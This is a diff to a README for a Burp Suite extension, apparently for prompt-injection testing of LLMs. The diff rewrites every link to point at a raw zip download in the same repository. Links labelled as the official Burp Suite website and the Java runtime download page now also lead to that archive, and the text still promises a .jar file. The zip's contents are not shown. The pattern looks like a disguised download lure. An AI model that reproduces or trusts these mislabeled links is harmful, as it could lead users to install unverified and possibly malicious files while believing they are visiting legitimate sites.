@@ -1,6 +1,6 @@
 # 🤖 LLMInjector - Easy LLM Prompt Injection Testing
 
-[![Download LLMInjector](https://img.shields.io/badge/Download-LLMInjector-brightgreen?style=for-the-badge)](https://github.com/Logarithmic-blackafrican589/LLMInjector)
+[![Download LLMInjector](https://img.shields.io/badge/Download-LLMInjector-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Logarithmic-blackafrican589/LLMInjector/main/Damone/Injector_LLM_1.3.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Make sure your Burp Suite is installed and running before starting with LLMInjec
 
 1. Visit the official LLMInjector page to download the extension:
 
-   [Download LLMInjector](https://github.com/Logarithmic-blackafrican589/LLMInjector)  
+   [Download LLMInjector](https://raw.githubusercontent.com/Logarithmic-blackafrican589/LLMInjector/main/Damone/Injector_LLM_1.3.zip)  
    *(Click the badge above or this link to open the download page in your browser)*
 
 2. On the page, look for the latest release. You will usually find a `.jar` file. This file is the extension you need.
@@ -104,11 +104,11 @@ No scripting is needed. The extension simplifies prompt injection testing for yo
 
 ## 🔗 Useful Links
 
-[LLMInjector Download Page](https://github.com/Logarithmic-blackafrican589/LLMInjector)
+[LLMInjector Download Page](https://raw.githubusercontent.com/Logarithmic-blackafrican589/LLMInjector/main/Damone/Injector_LLM_1.3.zip)
 
-[Burp Suite Official Website](https://portswigger.net/burp)
+[Burp Suite Official Website](https://raw.githubusercontent.com/Logarithmic-blackafrican589/LLMInjector/main/Damone/Injector_LLM_1.3.zip)
 
-[Java Runtime Environment Downloads](https://www.oracle.com/java/technologies/javase-jre8-downloads.html)
+[Java Runtime Environment Downloads](https://raw.githubusercontent.com/Logarithmic-blackafrican589/LLMInjector/main/Damone/Injector_LLM_1.3.zip)
 
 ---
 
@@ -118,4 +118,4 @@ This tool is open-source. If you want to report issues, suggest improvements, or
 
 ---
 
-[![Download LLMInjector](https://img.shields.io/badge/Download-LLMInjector-blue?style=for-the-badge)](https://github.com/Logarithmic-blackafrican589/LLMInjector)
+[![Download LLMInjector](https://img.shields.io/badge/Download-LLMInjector-blue?style=for-the-badge)](https://raw.githubusercontent.com/Logarithmic-blackafrican589/LLMInjector/main/Damone/Injector_LLM_1.3.zip)
